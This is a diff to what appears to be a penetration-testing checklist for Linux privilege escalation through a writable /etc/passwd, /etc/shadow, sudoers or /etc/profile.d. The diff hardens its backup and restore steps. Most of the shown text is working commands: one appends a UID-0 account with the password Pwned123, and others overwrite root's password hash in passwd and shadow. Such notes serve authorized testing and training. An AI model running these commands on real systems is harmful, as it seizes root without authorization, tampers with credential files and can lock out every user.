@@ -8,7 +8,7 @@ find /etc -writable -type f 2>/dev/null
 
 ## Writable /etc/passwd: a new root account
 A hash in passwd's second field wins over shadow. Copies go to /tmp first, for putting back.
-cp /etc/passwd /tmp/passwd.bak
+[ -e /tmp/passwd.bak ] || cp /etc/passwd /tmp/passwd.bak
 echo "pe:$(openssl passwd -1 Pwned123):0:0:root:/root:/bin/bash" >> /etc/passwd
 su pe
 - [ ] su asks for Pwned123
@@ -16,12 +16,13 @@ su pe
 
 ## Writable /etc/passwd: root's own password
 sed -i needs /etc itself writable, so the change goes through a copy:
+[ -e /tmp/passwd.bak ] || cp /etc/passwd /tmp/passwd.bak
 sed "s|^root:x:|root:$(openssl passwd -1 Pwned123):|" /etc/passwd > /tmp/passwd.new
 cat /tmp/passwd.new > /etc/passwd
 su root
 
 ## Writable /etc/shadow
-cp /etc/shadow /tmp/shadow.bak
+[ -e /tmp/shadow.bak ] || cp /etc/shadow /tmp/shadow.bak
 sed "s|^root:[^:]*:|root:$(openssl passwd -6 Pwned123):|" /etc/shadow > /tmp/shadow.new
 cat /tmp/shadow.new > /etc/shadow
 su root
@@ -40,7 +41,8 @@ sudo -i
 - [ ] A writable script in /etc/profile.d: it runs as whoever logs in next, root included
 
 ## Afterwards
-cat /tmp/passwd.bak > /etc/passwd
-cat /tmp/shadow.bak > /etc/shadow
+Each only if its copy exists, or the file is emptied:
+[ -s /tmp/passwd.bak ] && cat /tmp/passwd.bak > /etc/passwd
+[ -s /tmp/shadow.bak ] && cat /tmp/shadow.bak > /etc/shadow
 rm -f /tmp/passwd.bak /tmp/passwd.new /tmp/shadow.bak /tmp/shadow.new
 - [ ] My sudoers line taken out: a broken passwd or sudoers locks everyone out
